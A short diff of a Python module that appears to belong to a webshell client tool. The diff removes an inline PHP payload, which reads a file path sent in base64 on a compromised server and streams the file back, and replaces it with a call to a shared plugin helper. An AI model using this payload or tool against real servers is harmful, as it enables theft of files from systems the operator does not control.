@@ -2,19 +2,11 @@ from os import makedirs, path
 
 from libs.config import alias, color, gget
 from libs.myapp import base64_encode, send
+from libs.functions.webshell_plugins.download import *
 
 
 def get_php(web_file_path: str):
-    return """function download($fd){
-if (@file_exists($fd)){
-$fileinfo = pathinfo($fd);
-header("Content-type: application/x-" . $fileinfo["extension"]);
-header("Content-Disposition: attachment; filename=" . $fileinfo["basename"]);
-@readfile($fd);
-}
-}
-download(base64_decode("%s"));
-""" % base64_encode(web_file_path)
+    return get_php_download() % base64_encode(web_file_path)
 
 
 @alias(True, func_alias="d", _type="FILE", w="web_file_path", l="local_path")
